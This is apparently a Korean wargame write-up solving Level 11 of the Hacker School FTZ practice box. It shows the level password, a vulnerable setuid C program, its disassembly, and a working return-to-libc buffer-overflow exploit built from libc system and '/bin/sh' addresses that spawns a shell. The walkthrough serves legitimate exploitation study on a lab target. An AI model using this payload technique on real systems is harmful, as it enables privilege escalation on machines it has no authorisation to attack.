---
sort: 11
---

# Level 11

```note
id : level11

password : what!@#$?
```

level10까지는 리눅스 사용방법좀 소개하는 튜토리얼식이었는데 level11부터는 그냥 쌩 pwnable문제가 나온다.<br><br>
hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 조져보자.

```c
#include <stdio.h>
#include <stdlib.h>
 
int main( int argc, char *argv[] )
{
	char str[256];

 	setreuid( 3092, 3092 );
	strcpy( str, argv[1] );
	printf( str );
}
```

strcpy는 문자열의 길이에 상관없이 NULL문자를 만날때까지 복사를 한다. 따라서 buffer overflow 취약점이 존재한다.

## Buffer Overflow 풀이

buffer overflow를 통해 stack의 return address를 조작할 수 있고, 이는 함수가 끝날 때 정상적으로 이전 함수로 돌아가는 것이 아니라 공격자가 조작한 루틴으로 가게 할 수 있다. 따라서 쉘을 실행시켜주는 코드인 shellcode를 주입한 후, 해당 shellcode로 점프하게끔 아래와 같은 상황을 만들어주면 될 것이다.

<img src="/picture/hacker_school/ftz/level11_1.png" width="1000"/>

GDB를 이용하여 attackme의 main함수를 disassemble했다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x08048470 (main+0):	push   %ebp
0x08048471 (main+1):	mov    %esp,%ebp
0x08048473 (main+3):	sub    $0x108,%esp
0x08048479 (main+9):	sub    $0x8,%esp
0x0804847c (main+12):	push   $0xc14
0x08048481 (main+17):	push   $0xc14
0x08048486 (main+22):	call   0x804834c (setreuid)
0x0804848b (main+27):	add    $0x10,%esp
0x0804848e (main+30):	sub    $0x8,%esp
0x08048491 (main+33):	mov    0xc(%ebp),%eax
0x08048494 (main+36):	add    $0x4,%eax
0x08048497 (main+39):	pushl  (%eax)

<b>0x08048499 (main+41):	lea    0xfffffef8(%ebp),%eax
0x0804849f (main+47):	push   %eax
0x080484a0 (main+48):	call   0x804835c (strcpy) </b>

0x080484a5 (main+53):	add    $0x10,%esp
0x080484a8 (main+56):	sub    $0xc,%esp
0x080484ab (main+59):	lea    0xfffffef8(%ebp),%eax
0x080484b1 (main+65):	push   %eax
0x080484b2 (main+66):	call   0x804833c (printf)
0x080484b7 (main+71):	add    $0x10,%esp
0x080484ba (main+74):	leave  
0x080484bb (main+75):	ret
</pre>

strcpy가 사용되는 부분을 살펴보면 str의 시작부분은 ebp로부터 0x108byte위에 존재하는 것을 알 수 있다. 따라서 return address를 조지기 위해선 0x10c byte(padding 0x108 + ebp 0x04)길이의 padding 뒤에 우리가 원하는 주소값을 넣으면 된다.<br><br>
그러나 문제가 발생한다. stack 메모리 영역이 프로그램이 실행될때마다 다른 주소로 mapping이 되기 때문에 실행할 때마다 주입한 shellcode의 주소가 달라진다.(ASLR) 이를 극복하기 위해서 padding을 shellcode보다 위에 놓고, padding내용을 아무것도 실행하지 말라는 뜻의 명령어인 0x90(nop)으로 채워넣어서 주소값이 변하더라도 padding영역 어느 곳으로 점프한다면 nop을 따라서 쭉 내려오다가 결국 shellcode를 실행할 수 있도록하는 즉, shellcode 실행의 확률을 높이는 nop sled를 사용할 수 있겠다. 그러나, 이것은 어디까지나 확률을 높이는 것일 뿐이기에, ASLR이 걸려있지 않은 다른 영역을 사용하는 방법을 모색했다.

<img src="/picture/hacker_school/ftz/level11_2.png" width="700"/>

### Return To Library (RTL)

```bash
[level11@ftz level11]$ ldd attackme 
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[level11@ftz level11]$ ldd attackme 
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[level11@ftz level11]$ ldd attackme 
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
```

ldd는 프로그램에 사용되는 shared library의 정보를 출력해주는 명령어이다.<br>
여러번 호출했음에도 불구하고 library의 주소값이 일치하는 것으로 보아 shared library에는 ASLR이 걸려있지 않은 것을 알 수 있다.<br>
shared library에 있는 system함수를 호출하기로 했다. system함수를 호출하기 위해선 __libc_system 함수를 호출해야한다.<br>
왜 __libc_system을 호출해야되는지 모르겠으면 직접 system함수를 호출하는 코드를 짜서 gdb로 뜯어보자.

```bash
[level11@ftz tmp]$ objdump -d /lib/tls/libc.so.6 > result.txt
[level11@ftz tmp]$ vi result.txt

4203f2c0 <__libc_system>:
4203f2c0:       55                      push   %ebp
4203f2c1:       89 e5                   mov    %esp,%ebp
4203f2c3:       83 ec 18                sub    $0x18,%esp
4203f2c6:       89 75 f8                mov    %esi,0xfffffff8(%ebp)
```

system의 인자로 우리가 실행하고자 하는 명령어를 담은 문자열의 주소값을 전달해야한다. shell을 얻고싶기 때문에 "/bin/sh"의 주소값을 찾아서 넣으면 된다. 신기하게도 libc 내부에는 "/bin/sh"값이 존재하기 때문에 strings명령어를 이용하여 위치를 찾을 수 있다. 그리고 이는 shared library안에 존재하는 것이므로 ASLR이 걸려있지 않다.

```bash
[level11@ftz tmp]$ strings -tx /lib/tls/libc.so.6 | grep "/bin/sh"
 127ea4 /bin/sh

# 0x42000000부터 libc library가 mapping되어있다.
(gdb) x/s 0x42127ea4
0x42127ea4 <__libc_ptyname2+2161>:	 "/bin/sh"
```

따라서 아래와 같이 입력을 해주면 쉘을 딸 수 있다. 주의할 점은 주소값은 little endian이기 때문에 반대로 적어줘야한다는 것이고, system함수 주소와 "/bin/sh" 주소 사이에 4byte padding이 들어가는 이유는 함수 호출 규약에 의해 함수의 첫번째 인자 위에 return address가 들어있어야 하기 때문에 return address부분에 padding을 넣은 것이다.

```bash
# padding 0x10c byte + system함수 주소 + 4byte padding + "/bin/sh" 주소
[level11@ftz level11]$ ./attackme `python -c "print('A'*0x10c + '\xc0\xf2\x03\x42\x41\x41\x41\x41\xa4\x7e\x12\x42\n')"`
sh-2.05b$ my-pass
```

```tip
## 알게 된 점

buffer overflow, nop sled, RTL

ASLR
```